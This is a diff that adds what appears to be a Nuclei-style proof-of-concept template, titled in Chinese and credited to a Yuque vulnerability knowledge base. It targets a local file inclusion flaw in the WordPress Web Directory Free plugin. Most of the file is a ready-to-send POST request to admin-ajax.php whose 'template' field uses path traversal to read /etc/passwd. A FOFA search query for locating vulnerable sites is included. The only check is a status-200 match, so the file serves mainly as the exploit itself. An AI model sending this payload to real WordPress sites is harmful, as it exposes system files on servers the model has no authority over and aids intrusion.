@@ -1,0 +1,25 @@
+id: poc-kddob4wbg75gr2sf
+info:
+  name: WordPress Web Directory Free插件本地包含漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kddob4wbg75gr2sf'
+  tags: other,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: kddob4wbg75gr2sf
+    fofa: body="/wp-content/plugins/web-directory-free"
+http:
+- raw:
+  - 'POST /wp-admin/admin-ajax.php HTTP/1.1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Host: {{Hostname}}
+
+    from_set_ajax=1&action=w2dc_controller_request&template=../../../../../etc/passwd'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
